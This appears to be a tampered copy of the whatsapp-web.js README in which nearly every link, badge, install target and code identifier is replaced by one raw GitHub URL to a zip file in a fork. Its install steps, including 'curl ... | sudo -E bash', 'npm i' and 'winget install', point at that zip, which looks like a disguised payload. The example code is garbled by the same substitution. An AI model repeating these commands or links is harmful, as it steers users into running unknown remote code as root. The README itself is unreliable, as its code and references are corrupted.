<div align="center">
    <br />
    <p>
        <a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip%20Logo%https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" title="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="WWebJS Website" width="500" /></a>
    </p>
    <br />
    <p>
		<a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="npm" /></a>
        <a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="Depfu" /></a>
        <img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="WhatsApp_Web 2.2346.52" />
        <a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="Discord server" /></a>
	</p>
    <br />
</div>

## About
**A WhatsApp API client that connects through the WhatsApp Web browser app**

The library works by launching the WhatsApp Web browser application and managing it using Puppeteer to create an instance of WhatsApp Web, thereby mitigating the risk of being blocked. The WhatsApp API client connects through the WhatsApp Web browser app, accessing its internal functions. This grants you access to nearly all the features available on WhatsApp Web, enabling dynamic handling similar to any other https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip application.

> [!IMPORTANT]
> **It is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.**

## Links

* [Website][website]
* [Guide][guide] ([source][guide-source]) _(work in progress)_
* [Documentation][documentation] ([source][documentation-source])
* [WWebJS Discord][discord]
* [GitHub][gitHub]
* [npm][npm]

## Installation

The module is now available on npm! `npm i https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip`

> [!NOTE]
> **Node ``v18+`` is required.**

## QUICK STEPS TO UPGRADE NODE

### Windows

#### Manual
Just get the latest LTS from the [official node website][nodejs].

#### npm
```powershell
sudo npm install -g n
sudo n stable
```

#### Choco
```powershell
choco install nodejs-lts
```

#### Winget
```powershell
winget install https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
```

### Ubuntu / Debian
```bash
curl -fsSL https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip | sudo -E bash - &&\
sudo apt-get install -y nodejs
```

## Example usage

```js
const { Client } = require('https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip');

const client = new Client();

https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('qr', (qr) => {
    // Generate and scan this code with your phone
    https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('QR RECEIVED', qr);
});

https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('ready', () => {
    https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('Client is ready!');
});

https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('message', msg => {
    if (https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip == '!ping') {
        https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('pong');
    }
});

https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip();
```

Take a look at [https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip][examples] for another examples with additional use cases.  
For further details on saving and restoring sessions, explore the provided [Authentication Strategies][auth-strategies].


## Supported features

| Feature  | Status |
| ------------- | ------------- |
| Multi Device  | ✅  |
| Send messages  | ✅  |
| Receive messages  | ✅  |
| Send media (images/audio/documents)  | ✅  |
| Send media (video)  | ✅ [(requires Google Chrome)][google-chrome]  |
| Send stickers | ✅ |
| Receive media (images/audio/video/documents)  | ✅  |
| Send contact cards | ✅ |
| Send location | ✅ |
| Send buttons | ❌  [(DEPRECATED)][deprecated-video] |
| Send lists | ❌  [(DEPRECATED)][deprecated-video] |
| Receive location | ✅ | 
| Message replies | ✅ |
| Join groups by invite  | ✅ |
| Get invite for group  | ✅ |
| Modify group info (subject, description)  | ✅  |
| Modify group settings (send messages, edit info)  | ✅  |
| Add group participants  | ✅  |
| Kick group participants  | ✅  |
| Promote/demote group participants | ✅ |
| Mention users | ✅ |
| Mention groups | ✅ |
| Mute/unmute chats | ✅ |
| Block/unblock contacts | ✅ |
| Get contact info | ✅ |
| Get profile pictures | ✅ |
| Set user status message | ✅ |
| React to messages | ✅ |
| Create polls | ✅ |
| Channels | ✅ |
| Vote in polls | 🔜 |
| Communities | 🔜 |

Something missing? Make an issue and let us know!

## Contributing

Feel free to open pull requests; we welcome contributions! However, for significant changes, it's best to open an issue beforehand. Make sure to review our [contribution guidelines][contributing] before creating a pull request. Before creating your own issue or pull request, always check to see if one already exists!

## Supporting the project

You can support the maintainer of this project through the links below

- [Support via GitHub Sponsors][gitHub-sponsors]
- [Support via PayPal][support-payPal]
- [Sign up for DigitalOcean][digitalocean] and get $200 in credit when you sign up (Referral)

## Disclaimer

This project is not affiliated, associated, authorized, endorsed by, or in any way officially connected with WhatsApp or any of its subsidiaries or its affiliates. The official WhatsApp website can be found at [https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip][whatsapp]. "WhatsApp" as well as related names, marks, emblems and images are registered trademarks of their respective owners. Also it is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.

## License

Copyright 2019 Pedro S Lopez  

Licensed under the Apache License, Version 2.0 (the "License");  
you may not use this project except in compliance with the License.  
You may obtain a copy of the License at https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip  

Unless required by applicable law or agreed to in writing, software  
distributed under the License is distributed on an "AS IS" BASIS,  
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  
See the License for the specific language governing permissions and  
limitations under the License.  


[website]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[guide]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[guide-source]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[documentation]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[documentation-source]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[discord]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[gitHub]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[npm]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[nodejs]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[examples]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[auth-strategies]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[google-chrome]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[deprecated-video]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[gitHub-sponsors]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[support-payPal]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[digitalocean]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[contributing]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
[whatsapp]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
